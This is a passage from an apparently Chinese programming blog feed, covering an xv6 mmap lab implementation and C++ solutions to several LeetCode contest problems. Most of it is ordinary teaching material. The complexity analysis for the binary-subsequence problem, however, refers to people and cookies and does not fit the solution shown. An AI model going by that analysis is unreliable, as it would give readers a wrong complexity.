class="number">0</span>);</span><br><span class="line">	p-&gt;vma[vma_offset].length -= length;</span><br><span class="line">	p-&gt;vma[vma_offset].addr += length;</span><br><span class="line">	<span class="comment">/* remove all mapped pages */</span></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;vma[vma_offset].length == <span class="number">0</span>) &#123;</span><br><span class="line">		p-&gt;vma[vma_offset].pf-&gt;ref--;</span><br><span class="line">		p-&gt;vma[vma_offset].valid = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* map files into process address spaces */</span></span><br><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_mmap</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 addr;	</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">  <span class="type">int</span> prot;</span><br><span class="line">  <span class="type">int</span> flag;</span><br><span class="line">  <span class="type">int</span> offset;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">file</span> *f;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* parse syscall args */</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">argaddr</span>(<span class="number">0</span>, &amp;addr) &lt; <span class="number">0</span> || <span class="built_in">argint</span>(<span class="number">1</span>, &amp;len) &lt; <span class="number">0</span> || <span class="built_in">argint</span>(<span class="number">2</span>, &amp;prot) &lt; <span class="number">0</span> || \</span><br><span class="line">  	 <span class="built_in">argint</span>(<span class="number">3</span>, &amp;flag) &lt; <span class="number">0</span> || <span class="built_in">argint</span>(<span class="number">4</span>, &amp;fd) &lt; <span class="number">0</span> || <span class="built_in">argint</span>(<span class="number">5</span>, &amp;offset) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  	 <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* fd to file struct */</span></span><br><span class="line">  <span class="keyword">if</span>(fd &lt; <span class="number">0</span> || fd &gt;= NOFILE || (f = <span class="built_in">myproc</span>()-&gt;ofile[fd]) == <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* we check the file readable and writeable */</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;writable == <span class="number">0</span> &amp;&amp; flag == MAP_SHARED &amp;&amp; (prot &amp; PROT_WRITE)) &#123;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* we add the map address at the end of virtual address */</span></span><br><span class="line">  addr = <span class="built_in">myproc</span>()-&gt;sz;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> * p = <span class="built_in">myproc</span>();</span><br><span class="line">  <span class="keyword">if</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(p-&gt;sz + len &gt; MAXVA) &#123;</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	p-&gt;sz += len;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">map_vma_add</span>(addr, f, len, prot, flag, offset);</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* unmap files into process address spaces */</span></span><br><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_munmap</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	uint64 addr;	</span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* parse syscall args */</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">argaddr</span>(<span class="number">0</span>, &amp;addr) &lt; <span class="number">0</span> || <span class="built_in">argint</span>(<span class="number">1</span>, &amp;len) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	 	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* we add the map address at the end of virtual address */</span>	</span><br><span class="line">	<span class="type">int</span> vma_offset = <span class="built_in">map_vma_query</span>(addr);</span><br><span class="line">	<span class="keyword">if</span> (vma_offset == <span class="number">-1</span>) &#123;</span><br><span class="line">		 <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="comment">/* remove all the pages from process */</span></span><br><span class="line">	<span class="built_in">map_unmap</span>(addr, len);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> `usertrap` 的实现：需要检测缺页中断，并去按照不同的缺页中断去处理，主要检测缺页的地址是否属于 `vma` 表项。</span><br><span class="line">```C++</span><br><span class="line">uint64 pcode = <span class="built_in">r_scause</span>();</span><br><span class="line">uint64 va = <span class="built_in">PGROUNDDOWN</span>(<span class="built_in">r_stval</span>());</span><br><span class="line"><span class="comment">// uint64 epc = r_sepc();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// page fault, valid virtual address, 记录trap发生的原因</span></span><br><span class="line"><span class="keyword">if</span> (pcode == <span class="number">15</span> || pcode == <span class="number">13</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(va &gt;= p-&gt;sz || va &lt;= p-&gt;trapframe-&gt;sp || va &gt; MAXVA) &#123;</span><br><span class="line">        p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> vma_offset = <span class="built_in">map_vma_query</span>(va);</span><br><span class="line">    <span class="keyword">if</span> (vma_offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// alloc a page</span></span><br><span class="line">        <span class="type">char</span> *mem = <span class="built_in">kalloc</span>();  </span><br><span class="line">        <span class="keyword">if</span>(mem == <span class="number">0</span>)&#123;</span><br><span class="line">            p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> fail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">        <span class="type">int</span> offset = p-&gt;vma[vma_offset].offset + <span class="built_in">PGROUNDDOWN</span>(va - p-&gt;vma[vma_offset].addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;get mmap page fault! va = %p\n&quot;</span>, va);</span><br><span class="line">        <span class="built_in">map_readfile</span>(vma_offset, offset, (uint64)mem, PGSIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// mapper a page for va</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">mappages</span>(p-&gt;pagetable,<span class="built_in">PGROUNDDOWN</span>(va), PGSIZE, (uint64)mem, (p-&gt;vma[vma_offset].permissions &lt;&lt; <span class="number">1</span>) | PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">kfree</span>(mem);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;get mmap page fault! va = %p\n&quot;</span>, va);</span><br><span class="line">            p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> fail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// p-&gt;trapframe-&gt;epc += epc;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, <span class="built_in">r_scause</span>(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, <span class="built_in">r_sepc</span>(), <span class="built_in">r_stval</span>());</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>fork</code> 操作时同时复制 <code>vma</code> 表项。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map_vma_init</span>(np-&gt;vma);</span><br><span class="line"><span class="built_in">map_vma_copy</span>(p-&gt;vma, np-&gt;vma);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;vma[i].valid) &#123;</span><br><span class="line">    np-&gt;vma[i].pf = <span class="built_in">filedup</span>(p-&gt;vma[i].pf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>exit</code> 操作时，同时移除 <code>vma</code> 表项。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// remove all map virtual address</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;vma[i].valid) &#123;</span><br><span class="line">    <span class="built_in">map_vma_remove</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总的来说这个 <code>lab</code> 还是非常有挑战性的，是个好的 <code>lab</code>，用户空间的 <code>page fault</code> 处理确实是个非常有效的利器，后期会继续深入学习以下 <code>GC</code> 的处理流程。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest biweekly 298</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/10/</url>
    <content><![CDATA[<h2 id="leetcode-contest-biweekly-298"><a href="#leetcode-contest-biweekly-298" class="headerlink" title="leetcode  contest biweekly 298"></a>leetcode  contest biweekly 298</h2><p>周末太匆忙，没有时间细想，打卡补题解。感觉第三题比第四题难。</p>
<h3 id="5242-兼具大小写的最好英文字母"><a href="#5242-兼具大小写的最好英文字母" class="headerlink" title="5242. 兼具大小写的最好英文字母"></a>5242. 兼具大小写的最好英文字母</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个由英文字母组成的字符串 <code>s</code> ，请你找出并返回 <code>s</code> 中的 最好 英文字母。返回的字母必须为大写形式。如果不存在满足条件的字母，则返回一个空字符串。</p>
<p>最好 英文字母的大写和小写形式必须 都 在 <code>s</code> 中出现。</p>
<p>英文字母 <code>b</code> 比另一个英文字母 <code>a</code> 更好 的前提是：英文字母表中，<code>b</code> 在 <code>a</code> 之 后 出现。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;lEeTcOdE&quot;</span><br><span class="line">输出：&quot;E&quot;</span><br><span class="line">解释：</span><br><span class="line">字母 &#x27;E&#x27; 是唯一一个大写和小写形式都出现的字母。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;arRAzFif&quot;</span><br><span class="line">输出：&quot;R&quot;</span><br><span class="line">解释：</span><br><span class="line">字母 &#x27;R&#x27; 是大写和小写形式都出现的最好英文字母。</span><br><span class="line">注意 &#x27;A&#x27; 和 &#x27;F&#x27; 的大写和小写形式也都出现了，但是 &#x27;R&#x27; 比 &#x27;F&#x27; 和 &#x27;A&#x27; 更好。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;AbCdEfGhIjK&quot;</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：</span><br><span class="line">不存在大写和小写形式都出现的字母。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s</code> 由小写和大写英文字母组成</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/greatest-english-letter-in-upper-and-lower-case">https://leetcode.cn/problems/greatest-english-letter-in-upper-and-lower-case</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们依次遍历数组即可，找到所有同时出现大写和小写形式，找到字典序最大的字母即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n + \Sigma)$, 其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(\Sigma)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">greatestLetter</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">cnt</span>(<span class="number">26</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">2</span>));</span><br><span class="line">        string res = <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp; c : s) &#123;</span><br><span class="line">            <span class="type">int</span> x = <span class="built_in">tolower</span>(c) - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">islower</span>(c)) &#123;</span><br><span class="line">                cnt[x][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cnt[x][<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[i][<span class="number">0</span>] &amp;&amp; cnt[i][<span class="number">1</span>]) &#123;</span><br><span class="line">                res[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span> + i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span> ? <span class="string">&quot;&quot;</span> : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="5218-个位数字为-K-的整数之和"><a href="#5218-个位数字为-K-的整数之和" class="headerlink" title="5218. 个位数字为 K 的整数之和"></a>5218. 个位数字为 K 的整数之和</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你两个整数 <code>num</code> 和 <code>k </code>，考虑具有以下属性的正整数多重集：</p>
<ul>
<li>每个整数个位数字都是 <code>k</code> 。</li>
<li>所有整数之和是 <code>num</code> 。</li>
<li>返回该多重集的最小大小，如果不存在这样的多重集，返回 <code>-1</code> 。</li>
</ul>
<p>注意：<br>多重集与集合类似，但多重集可以包含多个同一整数，空多重集的和为 <code>0</code> 。<br>个位数字 是数字最右边的数位。
 </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 58, k = 9</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">多重集 [9,49] 满足题目条件，和为 58 且每个整数的个位数字是 9 。</span><br><span class="line">另一个满足条件的多重集是 [19,39] 。</span><br><span class="line">可以证明 2 是满足题目条件的多重集的最小长度。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 37, k = 2</span><br><span class="line">输出：-1</span><br><span class="line">解释：个位数字为 2 的整数无法相加得到 37 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 0, k = 7</span><br><span class="line">输出：0</span><br><span class="line">解释：空多重集的和为 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>0 &lt;= num &lt;= 3000</code></li>
<li><code>0 &lt;= k &lt;= 9</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/sum-of-numbers-with-units-digit-k">https://leetcode.cn/problems/sum-of-numbers-with-units-digit-k</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的数学问题，分析如下:</li>
</ol>
<ul>
<li>如果 $num &#x3D; 0$ 此时我们应该直接返回 $0$.</li>
<li>假设最小长度为 $n$，则可以知道 $n \times k$ 的个位数一定与 $num$ 的个位数相等，且必须满足 $ n \times k \le num$.</li>
<li>由于题目中允许重复的元素，且满足长度最小，则假设我们已经找到最小的 $n$ 满足上述条件，则可以知道 $num$ 一定可以被拆解成 $n$ 个个位数字为 $k$ 的正整数，已知 $num &#x3D; (n-1) * k + (num - n*k) + k$，则可以拆分如下 :<br>$[k,k,k,\cdots, (num - (n-1)*k)]$，且满足 $num - (n-1) \times k$ 的个位数字一定为 $k$。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(C)$，其中 $C &#x3D; 10$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumNumbers</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> x = num % <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((k * i) % <span class="number">10</span>) == x &amp;&amp; (k * i &lt;= num)) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6099-小于等于-K-的最长二进制子序列"><a href="#6099-小于等于-K-的最长二进制子序列" class="headerlink" title="6099. 小于等于 K 的最长二进制子序列"></a>6099. 小于等于 K 的最长二进制子序列</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个二进制字符串 <code>s</code> 和一个正整数 <code>k</code> 。</p>
<p>请你返回 <code>s</code> 的 最长 子序列，且该子序列对应的 二进制 数字小于等于 <code>k</code> 。</p>
<p>注意：</p>
<ul>
<li>子序列可以有 前导 <code>0</code> 。</li>
<li>空字符串视为 <code>0</code> 。</li>
<li>子序列 是指从一个字符串中删除零个或者多个字符后，不改变顺序得到的剩余字符序列。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;1001010&quot;, k = 5</span><br><span class="line">输出：5</span><br><span class="line">解释：s 中小于等于 5 的最长子序列是 &quot;00010&quot; ，对应的十进制数字是 2 。</span><br><span class="line">注意 &quot;00100&quot; 和 &quot;00101&quot; 也是可行的最长子序列，十进制分别对应 4 和 5 。</span><br><span class="line">最长子序列的长度为 5 ，所以返回 5 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;00101001&quot;, k = 1</span><br><span class="line">输出：6</span><br><span class="line">解释：&quot;000001&quot; 是 s 中小于等于 1 的最长子序列，对应的十进制数字是 1 。</span><br><span class="line">最长子序列的长度为 6 ，所以返回 6 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s[i]</code> 要么是 <code>&#39;0&#39;</code> ，要么是 <code>&#39;1&#39;</code> 。</li>
<li><code>1 &lt;= k &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/longest-binary-subsequence-less-than-or-equal-to-k">https://leetcode.cn/problems/longest-binary-subsequence-less-than-or-equal-to-k</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的动态规划思路，为了方便计算，我们首先将字符串进行逆序处理。设 $dp[i]$ 表示字符串前 $i$ 个字符中所构成的小于等于 $k$ 的最长子串的长度，$val[i]$ 则表示当前最长长度时的值。当遍历到第 $i$ 个字符时，此时我们依次尝试是否添加 $s[i]$。</li>
</ol>
<ul>
<li>如果此时不添加第 $i$ 个字符到最终的字符串中，则满足 $dp[i] &#x3D; dp[i-1],val[i] &#x3D; val[i-1]$。</li>
<li>如果满足 $s[i] &#x3D; ‘0’$, 此时肯定可以添加 $s[i]$, 则此时 $dp[i] &#x3D; dp[i-1] + 1,val[i] &#x3D; val[i-1]$。</li>
<li>如果满足 $s[i] &#x3D; ‘1’$, 此时判段 $s[i]$ 加入到哪个子串后面, 假设 $s[i]$ 加在 第 $j$ 个字符后，则此时一定需要满足 $val[j] + 2^{dp[j]} \le k$ 才能合法加入，如果加入的后满足 $dp[j] + 1 &gt; dp[i-1] $ 或者 $dp[j] + 1 &#x3D; dp[i-1]，val[j] + 2^{dp[j]} &lt; val[i-1]$ 时，此时更新 $dp[i]$ 与 $val[i]$。</li>
<li>当然上述解法还可以进一步优化，优化到 $O(n)$，仔细思考一下，加入了 $s[i]$ 后实际上我们只增加了一位，此时我们应该只需要检测长度为 $dp[i-1] - 1$ 时的最小值即可，不需要遍历所有的前 $i-1$ 个可能的字符串长度，优化后可以将时间复杂度优化到 $O(n)$。</li>
</ul>
<ol start="2">
<li>贪心法，解法比较巧妙，可以参考<a href="https://leetcode.cn/problems/longest-binary-subsequence-less-than-or-equal-to-k/solution/fen-lei-tao-lun-tan-xin-by-endlesscheng-vnlx/">题解</a>，只用 $O(n)$ 的复杂度即可。</li>
<li>动态规划二:</li>
</ol>
<ul>
<li>设 $dp[i]$ 表示子字符串长度为 $i$ 时的最小值，设当前已经知道的最大长度为 $m$，此时当我们遍历第 $j$ 个字符时，可以得到以下结论:<ul>
<li>如果 $s[i] &#x3D;  <code>0</code>$，此时我们肯定可以将 <code>0</code> 直接加入到最长长度为 $m$ 的字符串的末尾，此时最大长度变为 $m + 1$, 且最大长度为 $k + 1$ 的最小值为 $dp[m + 1] &#x3D; dp[m]$;</li>
<li>如果 $s[i] &#x3D;  <code>1</code>$，此时我们先检测是否可以将 <code>1</code> 直接加入到最长长度为 $m$ 的字符串的末尾，如果满足加入后的值仍然小于等于 $k$，此时最大长度变为 $k + 1$，且最大长度为 $m + 1$ 的最小值为 $dp[m + 1] &#x3D; dp[m] | (1&lt;&lt;m)$;如果不能满足加入后的值小于等于 $k$, 则此时我们尝试将其加入到长度为 $m-1$ 的字符串末尾，如果满足加入后的值小于 $dp[m]$，则此时我们应当加入到 $m-1$ 的字符串末尾，此时需要更新 $dp[m]$。</li>
</ul>
</li>
</ul>
<ol start="4">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(k \times 3 ^ n)$, 其中 $k$ 人数，$n$ 表示饼干的数目。</li>
<li>空间复杂度：$O(k \times 2 ^ n)$，其中 $k$ 人数，$n$ 表示饼干的数目, 可以进行滚动数组优化空间为 $2^n$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><ul>
<li><code>dp</code>:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestSubsequence</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">        dp[<span class="number">0</span>].first = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">0</span>].second = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i].first = dp[i<span class="number">-1</span>].first;</span><br><span class="line">            dp[i].second = dp[i<span class="number">-1</span>].second;</span><br><span class="line">            <span class="keyword">if</span> (s[i - <span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                dp[i].first = dp[i<span class="number">-1</span>].first + <span class="number">1</span>;</span><br><span class="line">                dp[i].second = dp[i<span class="number">-1</span>].second;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (dp[j].first &lt; <span class="number">30</span>) &#123;</span><br><span class="line">                        <span class="type">long</span> <span class="type">long</span> curr = (<span class="number">1LL</span> &lt;&lt; dp[j].first)|dp[j].second;</span><br><span class="line">                        <span class="keyword">if</span> (curr &lt;= k) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (dp[j].first + <span class="number">1</span> &gt; dp[i].first || </span><br><span class="line">                                (dp[j].first + <span class="number">1</span> == dp[i].first &amp;&amp; </span><br><span class="line">                                 dp[i].second &gt; curr)) &#123;</span><br><span class="line">                                dp[i].first = dp[j].first + <span class="number">1</span>;</span><br><span class="line">                                dp[i].second = curr;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n].first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li><code>dp</code>:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestSubsequence</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i - <span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                dp[res + <span class="number">1</span>] = dp[res];</span><br><span class="line">                res++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (res &lt; <span class="number">31</span>) &#123;</span><br><span class="line">                    <span class="type">long</span> <span class="type">long</span> curr = dp[res] | (<span class="number">1</span> &lt;&lt; res);</span><br><span class="line">                    <span class="keyword">if</span> (curr &lt;= k) &#123;</span><br><span class="line">                        dp[res + <span class="number">1</span>] = curr;</span><br><span class="line">                        res++;</span><br><span class="line">                    &#125; <span 